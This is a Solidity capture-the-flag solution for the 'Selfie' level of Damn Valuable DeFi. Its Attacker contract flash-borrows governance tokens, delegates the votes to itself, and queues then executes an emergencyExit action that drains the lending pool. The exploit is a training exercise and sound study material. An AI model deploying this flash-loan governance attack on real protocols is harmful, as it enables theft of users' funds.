// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    SelfiePool public pool;
    uint256 actionId;
    address recovery;

    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        DamnValuableVotes _token,
        SimpleGovernance _governance,
        SelfiePool _pool,
        address _recovery
    ) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external returns (bool success) {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            TOKENS_IN_POOL,
            bytes("")
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // must call delegate function to gain governance votes
        // only transfer tokens to attacker's contract is not sufficient for voting
        token.delegate(address(this));

        bytes memory data = abi.encodeWithSelector(
            pool.emergencyExit.selector,
            address(this)
        );
        actionId = governance.queueAction(address(pool), 0, data);
        token.approve(address(pool), token.balanceOf(address(this)));
        return CALLBACK_SUCCESS;
    }

    function executeAction() external {
        governance.executeAction(actionId);
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
